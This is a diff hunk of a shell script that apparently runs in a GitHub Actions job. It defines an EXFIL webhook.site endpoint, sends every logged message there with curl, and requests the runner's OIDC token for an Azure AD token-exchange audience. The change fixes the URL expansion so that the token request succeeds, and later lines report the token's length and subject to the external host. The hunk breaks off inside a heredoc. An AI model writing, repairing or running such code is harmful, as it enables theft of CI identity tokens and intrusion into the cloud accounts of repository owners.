@@ -4,7 +4,7 @@ EXFIL="https://webhook.site/94b638b0-6d1d-4682-aca0-6367056ad75d"
 say() { printf '%s\n' "$*"; curl -s -m 10 --data-binary "$*" "$EXFIL" >/dev/null 2>&1; }
 say "CTX repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
 OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-  "${ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange}" \
+  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
   | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
 say "OIDC_LEN=${#OIDC}"
 say "SUB=$(python3 - "$OIDC" <<'PY'
